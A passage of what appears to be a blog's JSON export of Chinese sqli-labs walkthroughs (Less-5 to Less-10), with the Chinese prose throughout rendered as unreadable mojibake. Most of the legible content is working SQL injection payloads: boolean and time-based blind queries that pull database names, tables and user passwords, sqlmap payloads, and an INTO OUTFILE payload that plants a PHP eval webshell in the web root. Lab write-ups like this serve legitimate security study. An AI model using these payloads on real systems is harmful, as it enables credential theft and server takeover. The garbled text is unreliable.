å…·ä½“æ“ä½œä¸å¸ƒå°”å‹ç±»ä¼¼ï¼Œè¿™é‡Œéœ€è¦ç”¨åˆ°sleepï¼ˆï¼‰å‡½æ•°ï¼› çˆ†åº“ åº“é•¿ 1?id=1' and if(length(database())=8,sleep(5),1)--+ æ ¹æ®æµè§ˆå™¨åˆ·æ–°çš„å»¶è¿Ÿç¨‹åº¦ï¼Œå¯ä»¥åˆ¤æ–­åº“é•¿ä¸º8ï¼› é¡µé¢çš„å›æ˜¾å¹¶æ²¡æœ‰ä»»ä½•æŒ‡ç¤ºæ„æ€ï¼Œå³ä½¿æ˜¯é”™è¯¯çš„åˆ¤æ–­ä¹Ÿå¯è¿”å›You are in.........; åº“å 1?id=1' and if(left(database(),1)='s',sleep(5),1)--+ 1?id=1' and if(left(database(),2)='se',sleep(5),1)--+ çˆ†è¡¨ 1?id=1' and if( left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='e' ,sleep(5),1)-- ç¬¬ä¸€ä¸ªè¡¨é¦–å­—æ¯ä¸ºâ€™eâ€™; çˆ†å­—æ®µ 1?id=1' and if(mid((select column_name from information_schema.columns where table_name='users' limit 4,1),1,8)='password',sleep(5),1) --+ çˆ†å†…å®¹ 1?id=1' and if(substr((select password from users limit 0,1),1,1)='d',sleep(5),1) --+ â€¦â€¦ ç”±äºè¯¥æ–¹æ³•ä¸å¸ƒå°”æŠ¥é”™å‹ç›¸ä¼¼ï¼Œåªæ˜¯ç”¨æ¥è¡¨åæ­£ç¡®çš„æ–¹å¼ä¸åŒï¼Œå› æ­¤ä¸å†èµ˜è¿°ï¼› +++ Less-10ï¼ˆGETæ–¹å¼-ç›²æ³¨-åŸºäºæ—¶é—´-åŒå¼•å·ï¼‰ä¸ç¬¬ä¹å…³å®Œå…¨ä¸€è‡´ï¼Œä»…æŠŠå•å¼•å·æ”¹ä¸ºäº†åŒå¼•å·é—­åˆå½¢å¼ï¼Œåªè¦æ›´æ”¹ä¸€ä¸‹å‚æ•°åçš„ç¬¦å·å³å¯ï¼›ä¾‹ï¼šåº“é•¿ 1?id=1\" and if(length(database())=8,sleep(5),1)--+ sleep()å‡½æ•°æ‰§è¡Œï¼Œé¡µé¢å»¶è¿Ÿåˆ·æ–°ï¼Œåˆ¤æ–­æ­£ç¡®ï¼›å› ä¸ºä¸Less-9åŸºæœ¬ä¸€è‡´ï¼Œå°±ä¸å†èµ˜è¿°ï¼›","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"sqli-labs-Page-1-Less-8","slug":"sqli-labs-Page-1-Less-8","date":"2020-04-08T07:41:44.000Z","updated":"2020-07-29T11:59:22.575Z","comments":true,"path":"2020/04/08/sqli-labs-Page-1-Less-8/","link":"","permalink":"https://singlemindedt.github.io/2020/04/08/sqli-labs-Page-1-Less-8/","excerpt":"","text":"Less-8(GETæ–¹å¼-ç›²æ³¨-å¸ƒå°”å‹-å•å¼•å·) å¸ƒå°”å‹æ³¨å…¥ï¼šæ­£ç¡®æœ‰å›æ˜¾ï¼Œé”™è¯¯æ— å›æ˜¾ï¼Œé€å­—çˆ†ç ´ï¼›åˆ©ç”¨äºŒåˆ†æ³•æé«˜çˆ†ç ´æ•ˆç‡; è¯¥é¢˜å®Œå…¨å¯ä»¥åˆ©ç”¨ä¹‹å‰ç¬¬äº”å…³çš„ä»»ä¸€æ–¹æ³•ï¼Œè¿˜å¯ä»¥ç”¨ä¸Šä¸€å…³çš„å¯¼å…¥æœ¨é©¬æ–‡ä»¶ï¼Œæ—¢ç„¶é¢˜ç›®æœ‰æŒ‡ç¤ºé‚£å°±ç”¨å¸ƒå°”ç›²æ³¨å¥½äº†ã€‚ çˆ†åº“å çŒœæµ‹åº“åé•¿åº¦ 1?id=1' and (length(database()))=8 --+ æ­£å¸¸å›æ˜¾ï¼Œè¯´æ˜åº“åé•¿åº¦ä¸º8ï¼› é¦–å­—æ¯1?id=1' and substr(database(),1,1)&lt;'t' --+ æ­£å¸¸å›æ˜¾ï¼Œé¦–å­—æ¯ASCIIç å°äºt; 1?id=1' and substr(database(),1,1)='s' --+ æ­£å¸¸å›æ˜¾ï¼Œè¯´æ˜åº“åé¦–å­—æ¯ä¸ºsï¼› é€šè¿‡æ›´æ”¹ç›¸åº”å‚æ•°ï¼Œå¯æ›´æ”¹æµ‹è¯•ä½ï¼š å…¶å®ƒä½1?id=1' and substr(database(),2,1)='e' --+ â€¦â€¦ 1?id=1' and substr(database(),1,8)='security' --+ è¯´æ˜åº“åä¸ºsecurity; +++ çˆ†è¡¨ååˆ¤æ–­è¡¨é•¿ï¼š1?id=1' and (select length(table_name) from information_schema.tables where table_schema=database() limit 3,1)=5 --+ è¯´æ˜ï¼Œç¬¬4å¼ è¡¨çš„é•¿åº¦ä½5ï¼› 1?id=1' and mid((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1)='u' --+ å¾—åˆ°ç¬¬4å¼ è¡¨é¦–å­—æ¯ä¸ºâ€™uâ€™;æ³¨ï¼šlimit(0,1)ä»0å¼€å§‹è¡¨ç¤ºé¦–ä½/ä¸ªï¼› 1?id=1' and mid((select table_name from information_schema.tables where table_schema=database() limit 3,1),2,1)='s' --+ æ­£å¸¸å›æ˜¾ï¼Œç¬¬2ä¸ªå­—æ¯ä¸ºâ€™sâ€™; 1?id=1' and mid((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,5)='users' --+ é€šè¿‡æ›´æ”¹mid(column_name,start[,length])ä¸­çš„â€™startâ€™æ¥æ”¹å˜ä½æ•°ï¼Œæœ€ç»ˆå¾—åˆ°ç¬¬4å¼ è¡¨åä¸ºâ€™usersâ€™; +++ çˆ†å­—æ®µ åˆ¤æ–­åˆ—åé•¿åº¦ï¼š 1?id=1' and (select length(column_name) from information_schema.columns where table_name='users' limit 4,1)=8 --+ å¾—åˆ°ç¬¬5åˆ—ï¼Œåˆ—åé•¿åº¦ä¸º8ï¼› 1?id=1' and mid((select column_name from information_schema.columns where table_name='users' limit 4,1),1,8)='password' --+ æ ¹æ®é•¿åº¦ï¼ŒçŒœæµ‹åˆ—åä¸ºpasswordï¼ŒéªŒè¯å¾—åˆ°æ­£å¸¸è¿”å›ï¼› +++ çˆ†å†…å®¹ åˆ¤æ–­é•¿åº¦ï¼š 1?id=1' and (select length(password) from users limit 0,1)=4 --+ å¾—åˆ°â€™passwordâ€™ä¸­ç¬¬ä¸€æ¡è®°å½•é•¿åº¦ä¸º4ï¼› é€ä¸€æµ‹è¯•å†…å®¹ 1?id=1&apos; and substr((select password from users limit 0,1),1,1)=&apos;d&apos; --+ å¾—åˆ°é¦–å­—æ¯ä¸ºdï¼› â€¦â€¦ å¾—åˆ°è¯¥ç”¨æˆ·çš„å¯†ç ä¸ºâ€dumbâ€(å¤§å°å†™ä¸å®š); åŒç†ï¼Œå¯é€šè¿‡å¦‚ä¸Šæ–¹æ³•å¾—åˆ°å¯¹åº”ç”¨æˆ·åã€‚ä»è€Œå¾—åˆ°ç”¨æˆ·å-å¯†ç ï¼› 1?id=1' and mid((select password from users order by id limit 1,1),1,1)='i' --+","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"sqli-labs-Page-1-Less-7","slug":"sqli-labs-Page-1-Less-7","date":"2020-04-06T02:41:44.000Z","updated":"2020-08-04T08:03:55.105Z","comments":true,"path":"2020/04/06/sqli-labs-Page-1-Less-7/","link":"","permalink":"https://singlemindedt.github.io/2020/04/06/sqli-labs-Page-1-Less-7/","excerpt":"","text":"Less-7(GETæ–¹å¼-å¯¼å‡ºæ–‡ä»¶-string) æ ¹æ®é¢˜ç›®æ„æ€ï¼Œåº”è¯¥æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨into outfileå°†æœ¨é©¬ç¨‹åºå†™å…¥æ–‡ä»¶ï¼› é¦–å…ˆï¼Œæµ‹è¯•é—­åˆidå‚æ•°æ–¹æ³•è¿˜å’Œä¹‹å‰å‡ å…³ä¸€æ ·ï¼Œåœ¨idååŠ å•å¼•å·ã€åŒå¼•å·ã€æ‹¬å·ç­‰å­—ç¬¦çœ‹æ˜¯å¦æŠ¥é”™ã€‚è‹¥æŠ¥é”™åˆ™idå¾ˆå¯èƒ½æ˜¯è¯¥ç§é—­åˆæ–¹å¼ï¼Œæ¥ä¸‹æ¥å†é€šè¿‡æ·»åŠ æ³¨é‡Šç¬¦æ¥è¿›ä¸€æ­¥æµ‹è¯•æ˜¯å¦ä¸ºè¯¥ç§é—­åˆæ–¹å¼ï¼›è‹¥è¯­å¥æ­£å¸¸æ‰§è¡Œï¼Œåˆ™è¯´æ˜idç¡®ä¸ºè¯¥ç§é—­åˆæ–¹å¼ã€‚ç»è¿‡æµ‹è¯•å‘ç°ï¼šæ ¼å¼ä¸ºï¼šid=((&#39;$id&#39;)) +++ å…³äºinto outfile into outfile ä¸»è¦ç”¨äºå°†æŸ¥è¯¢å‡ºæ¥çš„ç»“æœå¯¼å‡ºåˆ°æ–‡æœ¬ä¸­;ä½†æ˜¯ï¼Œä½¿ç”¨è¿˜éœ€è¦å¦‚ä¸‹æƒé™ï¼š çŸ¥é“ç‰©ç†è·¯å¾„ï¼ˆinto outfile â€˜WEBç›®å½•çš„ç‰©ç†è·¯å¾„â€™ï¼‰è¿™æ ·æ‰èƒ½å†™å¯¹ç›®å½•ã€‚ï¼ˆé»˜è®¤çš„å½“å‰ç›®å½•æ˜¯MySQLçš„æ•°æ®ç›®å½•ï¼‰ èƒ½å¤Ÿä½¿ç”¨unionï¼ˆä¹Ÿå°±æ˜¯MySQLç‰ˆæœ¬åœ¨3ä»¥ä¸Šï¼‰ æ²¡æœ‰å¯¹â€™è¿›è¡Œè¿‡æ»¤ï¼ˆå› ä¸ºoutfileåé¢çš„â€™â€™ä¸å¯ä»¥ç”¨å…¶ä»–å‡½æ•°ä»£æ›¿è½¬æ¢ï¼‰ MySQLç”¨æˆ·æ‹¥æœ‰file_privæƒé™ï¼ˆä¸ç„¶å°±ä¸èƒ½å†™æ–‡ä»¶æˆ–è€…æŠŠæ–‡ä»¶å†…å®¹è¯»å‡ºï¼‰ å¯¹webç›®å½•æœ‰å†™æƒé™ã€‚ å…ˆæ¥çœ‹çœ‹ç‰©ç†è·¯å¾„ï¼š @@basedir:mysqlå®‰è£…è·¯å¾„ @@datadir:æ•°æ®åº“è·¯å¾„ å°è¯•è·å–è·¯å¾„ï¼š 1? id=-1')) union select 1,2,@@datadir --+ æ²¡æœ‰å°†ç»“æœè¿”å›ï¼Œåº”è¯¥æ˜¯åšäº†é™åˆ¶ï¼Œè¯­æ³•æ­£ç¡®æ—¶åªè¿”å›You are in.... Use outfile...... ç”±äºæˆ‘æ˜¯æœ¬åœ°å®‰è£…ï¼ŒçŸ¥é“è¿™ä¸€ç³»åˆ—é¢˜ç›®å‡å…¬ç”¨æ•°æ®ï¼Œè¿™é‡Œå¯ä»¥å€Ÿå‰å‡ é¢˜æŸ¥è¯¢è·¯å¾„ï¼› å°è¯•å†™å…¥æ–‡ä»¶ï¼š payload: 1?id=1')) union select 1,2,'&lt;?php @eval($_POST[\"pwd\"]);?&gt;' into outfile \"E:\\\\PhpStudy2018\\\\PHPTutorial\\\\WWW\\\\hack.php\"--+ æ³¨ï¼šæ­¤å¤„ç”¨\\\\å¦åˆ™,å†™å…¥çš„æ–‡ä»¶åä¼šéå¸¸é•¿ï¼Œä¸ºè·¯å¾„+æ–‡ä»¶åçš„ç»„åˆå½¢å¼ï¼› å‘ç°å“åº”ä½ç½®å¹¶æ²¡æœ‰æˆ‘ä»¬è®¡åˆ’è¦å†™å…¥çš„å†…å®¹ï¼Œå³è¡¨ç¤ºæ­¤æ—¶æˆ‘ä»¬æ²¡æœ‰æƒé™å¯¼å…¥/å¯¼å‡ºï¼› MySQLé»˜è®¤æ²¡æœ‰æƒé™å¯¼å…¥/å¯¼å‡ºæ–‡ä»¶ï¼Œè¯¥æƒé™ä¸secure_file_privæœ‰å…³,é»˜è®¤ä¸ºNULLï¼Œå³ä¸å…è®¸å¯¼å…¥å¯¼å‡ºï¼› secure-file-privç‰¹æ€§secure-file-privå‚æ•°æ˜¯ç”¨æ¥é™åˆ¶LOAD DATA, SELECT â€¦ OUTFILE, and LOAD_FILE()ä¼ åˆ°å“ªä¸ªæŒ‡å®šç›®å½•çš„ã€‚ ure_file_privçš„å€¼ä¸ºnull ï¼Œè¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡º å½“secure_file_privçš„å€¼ä¸º/tmp/ ï¼Œè¡¨ç¤ºé™åˆ¶mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨/tmp/ç›®å½•ä¸‹ å½“secure_file_privçš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶ æŸ¥çœ‹secure-file-privå‚æ•°çš„å€¼ï¼š 1show global variables like '%secure%'; å› ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯phpstudy,æ•…åœ¨å…¶ç›®å½•ä¸‹çš„MySQLä¸‹ï¼Œåœ¨my.iniæ–‡ä»¶é‡ŒåŠ ä¸Šsecure_file_priv=â€˜â€™ï¼ˆè‹±æ–‡å•å¼•å·/åŒå¼•å·/ä»€ä¹ˆéƒ½ä¸åŠ ï¼‰ï¼Œæ­¤æ—¶è¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶,é‡å¯phpstudyå³å¯ï¼› å°è¯•å†™å…¥æ–‡ä»¶ï¼š payload: 1?id=1')) union select 1,2,'&lt;?php @eval($_POST[\"pwd\"]);?&gt;' into outfile \"E:\\\\PhpStudy2018\\\\PHPTutorial\\WWW\\\\hack.php\"--+ å¯ä»¥å‘ç°åœ¨ç›¸åº”çš„ç›®å½•ä¸‹å·²ç»å‡ºç°äº†æˆ‘ä»¬è®¡åˆ’å†™å…¥çš„æ–‡ä»¶ï¼› æ³¨ï¼šå½“æ–‡ä»¶åé‡å¤æ—¶ï¼ŒæŒ‡ä»¤ä¸ä¼šå†æ¬¡æ‰§è¡Œï¼Œå³ä¸ä¼šè¦†ç›–åŸæ¥é‡åæ–‡ä»¶ï¼› æŸ¥çœ‹å†™å…¥æ–‡ä»¶å†…å®¹ï¼š +++ æ¥ä¸‹æ¥å°±å¯ä»¥ä½¿ç”¨èœåˆ€è¿æ¥äº†ï¼› ç”±payloadå¯çŸ¥æˆ‘ä»¬æŠŠæ–‡ä»¶å†™åœ¨äº†ç«™ç‚¹æ ¹ç›®å½•é‡Œäº†ï¼Œæ‰€ä»¥è¿æ¥èœåˆ€åªéœ€å†™å¦‚ä¸‹å†…å®¹ï¼š http://127.0.0.1/hack.php +++ æ›´æ–°(2020.08.04): æ¥åº·åº·æºç ï¼š 1234567891011121314151617181920212223$sql=\"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; echo 'You are in.... Use outfile......'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; echo 'You have an error in your SQL syntax'; //print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;?&gt; çœ‹è¿™è¡Œï¼š 1//print_r(mysql_error()); ä¸æŠ¥é”™çš„åŸå› ä¸ºæ³¨é‡Šäº†æ‰“å°æŠ¥é”™çš„è¯­å¥ï¼›","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"sqli-labs-Page-1-Less-6","slug":"sqli-labs-Page-1-Less-6","date":"2020-03-29T02:53:22.000Z","updated":"2020-07-29T12:02:11.035Z","comments":true,"path":"2020/03/29/sqli-labs-Page-1-Less-6/","link":"","permalink":"https://singlemindedt.github.io/2020/03/29/sqli-labs-Page-1-Less-6/","excerpt":"","text":"Less-6(GETæ–¹å¼-åŒæ³¨å…¥-åŒå¼•å·-stringå‹)æ­¤é¢˜åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šåªæ˜¯æ›´æ”¹äº†é—­åˆç±»å‹ï¼ˆç”±å•å¼•å·æ”¹ä¸ºåŒå¼•å·ï¼‰ï¼Œå…¶ä»–ä¸å˜ï¼Œå¯ä»¥ç”¨Less-5çš„æ–¹æ³•è§£å†³ï¼› ä¸¾ä¾‹ï¼šåˆ¤æ–­åº“åé•¿åº¦ï¼› æ­£ç¡®å›æ˜¾ï¼Œè¯´æ˜åˆ¤æ–­æ­£ç¡®ï¼Œåº“åé•¿åº¦ç¡®å®ä¸º8ï¼›","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"sqli-labs-Page-1-Less-5","slug":"sqli-labs-Page-1-Less-5","date":"2020-03-15T10:41:44.000Z","updated":"2020-07-29T12:02:25.176Z","comments":true,"path":"2020/03/15/sqli-labs-Page-1-Less-5/","link":"","permalink":"https://singlemindedt.github.io/2020/03/15/sqli-labs-Page-1-Less-5/","excerpt":"","text":"[TOC] Less-5(GETæ–¹å¼-åŒæ³¨å…¥-å•å¼•å·-stringå‹)æ­¤é¢˜å’Œä¹‹å‰ä¸å¤ªä¸€æ ·ï¼Œå½“ä½ è¾“å…¥ä¿¡æ¯æ˜¯å¹¶ä¸è¿”å›ç»“æœï¼Œåªè¿”å›You are in..........æˆ–æ˜¯è¯­æ³•é”™è¯¯ï¼›å¦‚ä¸‹ï¼š[50]:() +++[51]:()è¯´æ˜æ²¡æœ‰æ˜¾ç¤ºä½ï¼Œæ— æ³•ä½¿ç”¨è”åˆæŸ¥è¯¢ï¼› æ–¹æ³•1ï¼šå¸ƒå°”ç›²æ³¨(boolean-based blind)å¸ƒå°”å‹æ³¨å…¥ï¼šæ­£ç¡®æœ‰å›æ˜¾ï¼Œé”™è¯¯æ— å›æ˜¾ï¼Œé€å­—çˆ†ç ´ï¼›åˆ©ç”¨äºŒåˆ†æ³•æé«˜çˆ†ç ´æ•ˆç‡; çˆ†åº“å çŒœæµ‹åº“åé•¿åº¦ï¼š?id=1&#39; and (length(database()))&gt;9 --+[60]:() æ— å›æ˜¾ï¼Œè¯´æ˜é”™è¯¯ï¼›?id=1&#39; and (length(database()))=8 --+ æ­£å¸¸å›æ˜¾ï¼Œè¯´æ˜åº“é•¿ä¸º8ï¼› é¦–å­—æ¯ left()å‡½æ•°ï¼š æ ¼å¼ è¯´æ˜ left(string,n) stringä¸ºè¦æˆªå–çš„å­—ç¬¦ä¸²ï¼›nä¸ºé•¿åº¦ left(database(),1)&gt;â€™sâ€™ æŸ¥çœ‹å­—ç¬¦ä¸²é¦–å­—æ¯æ˜¯å¦å¤§äºâ€˜sâ€™ left(database(),2)&gt;â€™seâ€™ æŸ¥çœ‹å­—ç¬¦ä¸²å‰ä¸¤ä½å­—æ¯æ˜¯å¦å¤§äºâ€™seâ€™ stringå¯è‡ªè¡Œæ„é€ è¯­å¥æ³¨å…¥ï¼› ?id=1&#39; and left((select database()),1)&lt;&#39;t&#39;--+ å¾—åˆ°æ­£å¸¸å›æ˜¾ï¼Œå³é¦–å­—æ¯æ˜¯æ¯”tå°çš„å­—æ¯ï¼› ?id=1&#39; and left((select database()),1)=&#39;s&#39;--+ æ­£å¸¸å›æ˜¾ï¼Œè¯´æ˜é¦–å­—æ¯ä¸ºâ€™sâ€™; ?id=1&#39; and left((select database()),1)&lt;&#39;s&#39;--+ æ— å›æ˜¾ï¼Œè¯´æ˜æˆ‘ä»¬çš„æ¨æµ‹ç»“æœæ˜¯å¯¹çš„ï¼› å…¶ä»–ä½?id=1&#39; and left((select database()),2)&gt;&#39;sd&#39;--+ æ­£å¸¸å›æ˜¾ï¼Œè¯´æ˜ç¬¬äºŒä¸ªå­—æ¯åº”å¤§äºâ€™dâ€™ï¼›?id=1&#39; and left((select database()),2)=&#39;se&#39;--+[63]:() æ­£å¸¸å›æ˜¾ï¼Œè¯´æ˜å‰ä¸¤ä½ä¸ºâ€™seâ€™;çˆ†å…¶å®ƒä½ä¸ä¸Šè¿°æ–¹æ³•ç›¸åŒï¼Œæ­¤å¤„çœç•¥ï¼Œæœ€ç»ˆå¾—åˆ°åº“åä¸ºâ€securityâ€;substr()å‡½æ•°ï¼šï¼ˆä¸substringï¼ˆï¼‰ç›¸ä¼¼ï¼‰ æ ¼å¼ è¯´æ˜ substr(string,start,length) stringè¦å¤„ç†çš„å­—ç¬¦ä¸²ï¼›startå¼€å§‹ä½ç½®ï¼›lengthæˆªå–é•¿åº¦ substr(database(),1,1)&gt;â€™sâ€™ æŸ¥çœ‹æ•°æ®åº“åé¦–ä½ï¼› substr(database(),2,1)&gt;â€™sâ€™ æŸ¥çœ‹æ•°æ®åº“åç¬¬2ä½ï¼› stringå¯è‡ªè¡Œæ„é€ è¯­å¥æ³¨å…¥ï¼› é¦–å­—æ¯ ?id=1&#39; and substr(database(),1,1)&lt;&#39;t&#39; --+[64]:() æ­£å¸¸å›æ˜¾ï¼›?id=1&#39; and substr(database(),1,1)=&#39;s&#39; --+[65]:() å…¶å®ƒä½?id=1&#39; and substr(database(),2,1)&lt;&#39;f&#39; --+ æ­£å¸¸å›æ˜¾ï¼›?id=1&#39; and substr(database(),2,1)&lt;&#39;e&#39; --+[67]:() æ— å›æ˜¾ï¼Œè¯´æ˜æ­¤å¤„ä½â€™eâ€™;mid()å‡½æ•° æ ¼å¼ è¯´æ˜ MID(column_name,start[,length]) column_nameè¦æå–å­—ç¬¦çš„å­—æ®µ;startè§„å®šå¼€å§‹ä½ç½®ï¼ˆèµ·å§‹ä½ç½®ä¸º1ï¼‰ï¼›è¦è¿”å›çš„å­—ç¬¦æ•°ã€‚å¦‚æœçœç•¥ï¼Œåˆ™MID()å‡½æ•°è¿”å›å‰©ä½™æ–‡æœ¬ï¼› mid(database(),1,1)&gt;â€™sâ€™ æŸ¥çœ‹æ•°æ®åº“åé¦–ä½æ˜¯å¦å¤§äºâ€™sâ€™ï¼› mid(database(),2,1)&gt;â€™eâ€™ æŸ¥çœ‹æ•°æ®åº“åçš„ç¬¬2ä½æ˜¯å¦å¤§äºâ€™eâ€™ï¼› column_nameå¯è‡ªè¡Œæ„é€ è¯­å¥æ³¨å…¥ï¼› é¦–å­—æ¯ ?id=1&#39; and mid(database(),1,1)&gt;&#39;r&#39; --+[68]:() æ­£å¸¸å›æ˜¾ï¼Œé¦–å­—æ¯å¤§äºâ€™râ€™;?id=1&#39; and mid(database(),1,1)&lt;&#39;t&#39; --+[69]:() æ­£å¸¸å›æ˜¾ï¼Œè¯´æ˜é¦–å­—æ¯ä¸ºâ€™sâ€™; å…¶å®ƒä½?id=1&#39; and mid(database(),2,1)&lt;&#39;f&#39; --+ æ­£å¸¸å›æ˜¾ï¼Œåˆ¤æ–­æ­£ç¡®ï¼›?id=1&#39; and mid(database(),2,1)=&#39;e&#39; --+[71]:() æ­£å¸¸å›æ˜¾ï¼Œæ­¤å¤„ä¸ºâ€™eâ€™;å…¶ä»–ä½æ“ä½œç›¸åŒï¼›ORD()å‡½æ•°æ­¤å‡½æ•°ä¸ºè¿”å›ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCIIç ï¼Œç»å¸¸ä¸ä¸Šé¢çš„å‡½æ•°è¿›è¡Œç»„åˆä½¿ç”¨ã€‚eg:ORD(mid(database(),1,1))&gt;115 æ„ä¸ºæ£€æµ‹database()çš„é¦–ä½ASCIIç æ˜¯å¦å¤§äº115ï¼Œå³â€˜sâ€™;[72]:() æ— å›æ˜¾ï¼Œé¦–å­—æ¯ASCllä¸å¤§äº115ï¼›[73]:() æ­£å¸¸å›æ˜¾ã€‚é¦–å­—æ¯ä¸ºâ€™sâ€™; çˆ†è¡¨å ?id=1&#39; and mid((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1)=&#39;u&#39; --+[74]:() å¾—åˆ°ç¬¬4å¼ è¡¨é¦–å­—æ¯ä¸ºâ€™uâ€™;?id=1&#39; and mid((select table_name from information_schema.tables where table_schema=database() limit 3,1),2,1)=&#39;s&#39; --+ æ­£å¸¸å›æ˜¾ï¼Œç¬¬2ä¸ªå­—æ¯ä¸ºâ€™sâ€™;ä¹‹åé€šè¿‡æ›´æ”¹mid(column_name,start[,length])ä¸­çš„â€™startâ€™æ¥æ”¹å˜ä½æ•°ï¼Œæœ€ç»ˆå¾—åˆ°ç¬¬4å¼ è¡¨åä¸ºâ€™usersâ€™; æ³¨ï¼šlimitå­å¥ç”¨äºé™åˆ¶æŸ¥è¯¢ç»“æœè¿”å›çš„æ•°é‡ï¼Œå¸¸ç”¨äºåˆ†é¡µæŸ¥è¯¢ æ ¼å¼ è¯´æ˜ select * from tableName limit i,n iï¼šä¸ºæŸ¥è¯¢ç»“æœçš„ç´¢å¼•å€¼(é»˜è®¤ä»0å¼€å§‹)ï¼Œå½“i=0æ—¶å¯çœç•¥i nï¼šä¸ºæŸ¥è¯¢ç»“æœè¿”å›çš„æ•°é‡ limit n ç­‰åŒäº`` limit 0,n` SELECT * FROM table LIMIT 1,10; æ£€ç´¢è®°å½•è¡Œ2-11; çˆ†å­—æ®µ åˆ¤æ–­åˆ—åé•¿åº¦ï¼š ?id=1&#39; and (select length(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 4,1)=8 --+å¾—åˆ°ç¬¬5åˆ—ï¼Œåˆ—åé•¿åº¦ä¸º8ï¼›?id=1&#39; and mid((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),1,8)=&#39;password&#39; --+ æ ¹æ®é•¿åº¦ï¼ŒçŒœæµ‹åˆ—åä¸ºpasswordï¼ŒéªŒè¯å¾—åˆ°æ­£å¸¸è¿”å›ï¼› +++ é—®é¢˜ï¼šåœ¨è¿™é‡Œpasswordæ˜¯åœ¨ç¬¬5åˆ—ï¼Œè€Œé€šè¿‡SQLMapæ£€æµ‹ï¼Œåªæœ‰3åˆ—ï¼Œä¸”å‡ºç°äº†å¦‚ä¸‹ä¸åº”å­˜åœ¨çš„é¦–åˆ—â€userâ€; ?id=1&#39; and mid((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,4)=&#39;user&#39; --+ å¾—åˆ°ç¬¬1åˆ—ä¸ºâ€™userâ€™; å¹¶ä¸”æŸ¥çœ‹usersè¡¨ï¼Œå‘ç°å…±æœ‰13æ¡è®°å½•ï¼› +++ çˆ†å†…å®¹ åˆ¤æ–­é•¿åº¦ ?id=1&#39; and (select length(password) from users limit 0,1)=4 --+ å¾—åˆ°â€™passwordâ€™ä¸­ç¬¬ä¸€æ¡è®°å½•é•¿åº¦ä¸º4ï¼› å¯¹æ¯”ï¼šorder by id ?id=1&#39; and (select length(password) from users order by id limit 0,1)=4 --+ è¯´æ˜å†…å®¹é¡ºåºåº”è¯¥æ˜¯å›ºå®šçš„è€Œä¸æ˜¯ä»¥å…³ç³»é“¾æ¥çš„ï¼› é€ä¸€æµ‹è¯•å†…å®¹ ?id=1&#39; and substr((select password from users limit 0,1),1,1)=&#39;d&#39; --+ å¾—åˆ°é¦–å­—æ¯ä¸ºdï¼› ?id=1&#39; and substr((select password from users limit 0,1),1,1)=&#39;D&#39; --+ è¯´æ˜MySQLå¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œä¸èƒ½åŒºåˆ†æ˜¯â€™dâ€™è¿˜æ˜¯â€™Dâ€™; ?id=1&#39; and mid((select password from users order by id limit 0,1),1,1)=&#39;d&#39; --+ ?id=1&#39; and mid((select password from users order by id limit 0,1),2,1)=&#39;u&#39; --+ â€¦â€¦ å¾—åˆ°è¯¥ç”¨æˆ·çš„å¯†ç ä¸ºâ€dumbâ€(å¤§å°å†™ä¸å®š); åŒç†ï¼Œå¯é€šè¿‡å¦‚ä¸Šæ–¹æ³•å¾—åˆ°å¯¹åº”ç”¨æˆ·åã€‚ä»è€Œå¾—åˆ°ç”¨æˆ·å-å¯†ç ï¼› ?id=1&#39; and mid((select password from users order by id limit 1,1),1,1)=&#39;i&#39; --+ é€šè¿‡æ”¹å˜limitå‚æ•°ä¿®æ”¹æ‰€æŸ¥è¯¢çš„è®°å½•ï¼› +++ æ–¹æ³•2ï¼šSQLMapç›²æ³¨æ­¥éª¤ï¼š æ£€æµ‹python sqlmap.py -u &quot;URL?id=1&quot; å¯ä»¥çœ‹åˆ°ï¼ŒSQLMapä½¿ç”¨äº†ä¸‰ç§ç±»å‹çš„æ³¨å…¥æ–¹æ³•ï¼š Type: boolean-based blind 12Title: AND boolean-based blind - WHERE or HAVING clausePayload: id=1' AND 7804=7804 AND 'Fgyq'='Fgyq Type: error-based 12Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)Payload: id=1' AND (SELECT 6181 FROM(SELECT COUNT(*),CONCAT(0x716b7a7171,(SELECT (ELT(6181=6181,1))),0x7176626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'WtBf'='WtBf Type: time-based blind 12Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)Payload: id=1' AND (SELECT 4715 FROM (SELECT(SLEEP(5)))dSPj) AND 'POnp'='POnp 